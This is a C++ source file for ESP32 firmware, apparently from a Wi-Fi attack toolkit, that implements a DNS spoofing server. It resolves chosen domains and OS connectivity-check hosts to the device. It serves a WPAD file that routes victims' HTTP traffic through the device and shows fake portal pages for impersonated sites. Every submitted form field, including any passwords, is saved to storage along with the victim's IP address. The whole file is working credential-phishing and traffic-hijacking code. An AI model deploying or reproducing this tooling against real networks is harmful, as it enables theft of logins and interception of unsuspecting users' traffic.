#include "utils/network/DnsSpoofServer.h"
#include "core/Device.h"
#include "utils/StorageUtil.h"
#include <WiFi.h>

// ── Public ──────────────────────────────────────────────────────────────────

bool DnsSpoofServer::begin(IPAddress apIP)
{
  _apIP = apIP;
  _loadConfig();

  if (!_dnsUdp.begin(53)) return false;

  _startWeb();
  _running = true;
  return true;
}

void DnsSpoofServer::end()
{
  if (!_running) return;
  _running = false;

  _stopWeb();
  _dnsUdp.stop();
}

void DnsSpoofServer::update()
{
  if (!_running) return;
  _processDns();
}

// ── Config ──────────────────────────────────────────────────────────────────

bool DnsSpoofServer::_loadConfig()
{
  _recordCount = 0;
  if (!Uni.Storage || !Uni.Storage->exists(CONFIG_PATH)) return false;

  String content = Uni.Storage->readFile(CONFIG_PATH);
  if (content.isEmpty()) return false;

  int start = 0;
  while (start < (int)content.length() && _recordCount < MAX_RECORDS) {
    int end = content.indexOf('\n', start);
    if (end < 0) end = content.length();

    String line = content.substring(start, end);
    line.trim();
    start = end + 1;

    if (line.isEmpty() || line.startsWith("#")) continue;

    int sep = line.indexOf(':');
    if (sep <= 0) continue;

    String domain = line.substring(0, sep);
    String path   = line.substring(sep + 1);
    domain.trim();
    path.trim();

    if (domain.isEmpty() || path.isEmpty()) continue;

    strncpy(_records[_recordCount].domain, domain.c_str(), sizeof(_records[0].domain) - 1);
    strncpy(_records[_recordCount].path,   path.c_str(),   sizeof(_records[0].path) - 1);
    _recordCount++;
  }

  return _recordCount > 0;
}

// ── DNS Server ──────────────────────────────────────────────────────────────

void DnsSpoofServer::_processDns()
{
  int len = _dnsUdp.parsePacket();
  if (len <= 0 || len > 512) return;

  uint8_t buf[512];
  _dnsUdp.read(buf, len);

  // Must be a standard query (QR=0, OPCODE=0)
  if (len < 12) return;
  if (buf[2] & 0x80) return;

  // Extract domain name from question section
  char domain[256] = {};
  int pos = 12; // skip header
  int dpos = 0;
  while (pos < len && buf[pos] != 0) {
    uint8_t labelLen = buf[pos++];
    if (pos + labelLen > len) return;
    if (dpos > 0) domain[dpos++] = '.';
    memcpy(&domain[dpos], &buf[pos], labelLen);
    dpos += labelLen;
    pos += labelLen;
  }
  domain[dpos] = 0;
  pos++; // skip null terminator

  // Read QTYPE
  uint16_t qtype = (buf[pos] << 8) | buf[pos + 1];
  pos += 4; // skip QTYPE + QCLASS

  // Only respond to A record queries (type 1)
  if (qtype != 1) return;

  // Forward unconfigured domains to upstream DNS (if set)
  if (!_findPath(domain) && _upstreamDns != IPAddress(0, 0, 0, 0)) {
    if (_captiveIntercept && _isCaptiveDomain(domain)) {
      // fall through to resolve to our IP
    } else {
      _forwardDns(buf, len);
      return;
    }
  }

  // Resolve domain to ESP32 IP
  buf[2] = 0x84; // QR=1, AA=1
  buf[3] = 0x00; // RCODE=0
  buf[6] = 0x00; buf[7] = 0x01; // ANCOUNT=1

  // Answer section: pointer to name in question
  buf[pos++] = 0xC0; buf[pos++] = 0x0C; // name pointer
  buf[pos++] = 0x00; buf[pos++] = 0x01; // TYPE A
  buf[pos++] = 0x00; buf[pos++] = 0x01; // CLASS IN
  buf[pos++] = 0x00; buf[pos++] = 0x00;
  buf[pos++] = 0x00; buf[pos++] = 0x3C; // TTL 60s
  buf[pos++] = 0x00; buf[pos++] = 0x04; // RDLENGTH
  buf[pos++] = _apIP[0];
  buf[pos++] = _apIP[1];
  buf[pos++] = _apIP[2];
  buf[pos++] = _apIP[3];

  _dnsUdp.beginPacket(_dnsUdp.remoteIP(), _dnsUdp.remotePort());
  _dnsUdp.write(buf, pos);
  _dnsUdp.endPacket();
}

void DnsSpoofServer::_forwardDns(uint8_t* buf, int len)
{
  // Forward the original query to the upstream DNS server
  WiFiUDP fwd;
  fwd.begin(0); // ephemeral port
  fwd.beginPacket(_upstreamDns, 53);
  fwd.write(buf, len);
  fwd.endPacket();

  // Wait for response (up to 2s)
  unsigned long start = millis();
  while (millis() - start < 2000) {
    int rlen = fwd.parsePacket();
    if (rlen > 0 && rlen <= 512) {
      uint8_t rbuf[512];
      fwd.read(rbuf, rlen);
      fwd.stop();

      // Relay the upstream response back to the original client
      _dnsUdp.beginPacket(_dnsUdp.remoteIP(), _dnsUdp.remotePort());
      _dnsUdp.write(rbuf, rlen);
      _dnsUdp.endPacket();
      return;
    }
    delay(10);
  }
  fwd.stop();
}

bool DnsSpoofServer::_matchDomain(const char* query, const char* config)
{
  // Case-insensitive match, also match subdomains
  // e.g. config="google.com" matches "google.com" and "www.google.com"
  int qlen = strlen(query);
  int clen = strlen(config);
  if (qlen == clen) return strcasecmp(query, config) == 0;
  if (qlen > clen && query[qlen - clen - 1] == '.') {
    return strcasecmp(&query[qlen - clen], config) == 0;
  }
  return false;
}

const char* DnsSpoofServer::_findPath(const char* domain)
{
  for (int i = 0; i < _recordCount; i++) {
    if (_matchDomain(domain, _records[i].domain)) {
      return _records[i].path;
    }
  }
  return nullptr;
}

bool DnsSpoofServer::_isCaptiveDomain(const char* domain)
{
  return strcasestr(domain, "captive.apple") ||
         strcasecmp(domain, "connectivitycheck.gstatic.com") == 0 ||
         strcasecmp(domain, "clients3.google.com") == 0 ||
         strcasecmp(domain, "www.msftconnecttest.com") == 0 ||
         strcasecmp(domain, "ipv6.msftncsi.com") == 0 ||
         strcasecmp(domain, "www.msftncsi.com") == 0 ||
         strcasecmp(domain, "nmcheck.gnome.org") == 0 ||
         strcasecmp(domain, "detectportal.firefox.com") == 0;
}

// ── Web Server (Port 80) ───────────────────────────────────────────────────

void DnsSpoofServer::_startWeb()
{
  _webServer = new AsyncWebServer(80);

  // WPAD proxy auto-config — routes all HTTP through us
  _webServer->on("/wpad.dat", HTTP_GET, [this](AsyncWebServerRequest* req) {
    String pac = "function FindProxyForURL(url, host) {\n"
                 "  return \"PROXY " + _apIP.toString() + ":80\";\n"
                 "}\n";
    req->send(200, "application/x-ns-proxy-autoconfig", pac);
  });

  _webServer->onNotFound([this](AsyncWebServerRequest* req) {
    if (!Uni.Storage) {
      req->send(404, "text/plain", "Not Found");
      return;
    }

    // HTTPS CONNECT (method=32, url="host:port") — can't MITM, reject early
    String rawUrl = req->url();
    if (rawUrl.indexOf("://") < 0 && rawUrl.indexOf(':') > 0) {
      req->send(502, "text/plain", "");
      return;
    }

    String host = req->host();
    int colon = host.indexOf(':');
    if (colon > 0) host = host.substring(0, colon);

    // Handle POST — save submitted data
    if (req->method() == HTTP_POST) {
      String data;
      for (int i = 0; i < (int)req->params(); i++) {
        const AsyncWebParameter* p = req->getParam(i);
        if (p->isPost()) {
          if (data.length() > 0) data += "&";
          data += p->name() + "=" + p->value();
        }
      }

      if (data.length() > 0) {
        if (Uni.Storage && StorageUtil::hasSpace()) {
          String cleanHost = host;
          cleanHost.replace(".", "_");
          String savePath = "/unigeek/wifi/captives/spoof_" + cleanHost + ".txt";
          Uni.Storage->makeDir("/unigeek/wifi/captives");

          String entry = req->client()->remoteIP().toString() + " | " + data + "\n";
          fs::File f = Uni.Storage->open(savePath.c_str(), FILE_APPEND);
          if (f) {
            f.print(entry);
            f.close();
          }
        } else if (_visitCb) {
          _visitCb("", "[!] Storage full, skip save");
        }

        if (_postCb) {
          _postCb(req->client()->remoteIP().toString().c_str(),
                  host.c_str(), data.c_str());
        }
      }

      req->redirect("/");
      return;
    }

    // Log GET visit
    if (_visitCb) {
      _visitCb(req->client()->remoteIP().toString().c_str(), host.c_str());
    }

    // unigeek.local → redirect to Web File Manager on port 8080
    if (_fileManagerEnabled && host.equalsIgnoreCase("unigeek.local")) {
      String url = "http://" + _apIP.toString() + ":8080" + req->url();
      req->redirect(url);
      return;
    }

    // Connectivity checks
    if (_isCaptiveDomain(host.c_str())) {
      if (_captiveIntercept) {
        if (_captivePath[0] != '\0') { _serveFromPath(_captivePath, req); }
        else { req->send(200, "text/html", "<html><body>Sign in</body></html>"); }
      } else {
        req->send(204); // pass connectivity check
      }
      return;
    }

    // Configured domain or fallback
    const char* p = _findPath(host.c_str());
    if (p) {
      _serveFromPath(p, req);
    } else if (_captiveIntercept) {
      _serveFromPath(_captivePath[0] != '\0' ? _captivePath : "/unigeek/wifi/portals/default", req);
    } else {
      req->send(204); // pass connectivity check for unconfigured domains
    }
  });

  _webServer->begin();
}

void DnsSpoofServer::_serveFromPath(const char* portalPath, AsyncWebServerRequest* req)
{
  String uri = req->url();

  // WPAD proxy sends full URL (http://host/path) — strip scheme+host to get /path
  if (uri.startsWith("http://")) {
    int slash = uri.indexOf('/', 7); // after "http://"
    uri = (slash > 0) ? uri.substring(slash) : "/";
  } else if (uri.startsWith("https://")) {
    int slash = uri.indexOf('/', 8);
    uri = (slash > 0) ? uri.substring(slash) : "/";
  }

  if (uri.endsWith("/")) uri += "index.htm";

  String filePath = String(portalPath) + uri;
  // Map .html requests to .htm files
  if (filePath.endsWith(".html")) {
    filePath = filePath.substring(0, filePath.length() - 5) + ".htm";
  }
  if (Uni.Storage->exists(filePath.c_str())) {
    req->send(Uni.Storage->getFS(), filePath, _mimeType(filePath), false);
  } else {
    // Any non-existent path -> serve index.htm
    String indexPath = String(portalPath) + "/index.htm";
    if (Uni.Storage->exists(indexPath.c_str())) {
      req->send(Uni.Storage->getFS(), indexPath, "text/html", false);
    } else {
      req->send(404, "text/plain", "Not Found");
    }
  }
}

const char* DnsSpoofServer::_mimeType(const String& path)
{
  if (path.endsWith(".htm") || path.endsWith(".html")) return "text/html";
  if (path.endsWith(".css"))  return "text/css";
  if (path.endsWith(".js"))   return "application/javascript";
  if (path.endsWith(".json")) return "application/json";
  if (path.endsWith(".png"))  return "image/png";
  if (path.endsWith(".jpg") || path.endsWith(".jpeg")) return "image/jpeg";
  if (path.endsWith(".gif"))  return "image/gif";
  if (path.endsWith(".svg"))  return "image/svg+xml";
  if (path.endsWith(".ico"))  return "image/x-icon";
  if (path.endsWith(".woff")) return "font/woff";
  if (path.endsWith(".woff2")) return "font/woff2";
  if (path.endsWith(".ttf"))  return "font/ttf";
  return "text/plain";
}

void DnsSpoofServer::_stopWeb()
{
  if (_webServer) {
    _webServer->end();
    delete _webServer;
    _webServer = nullptr;
  }
}
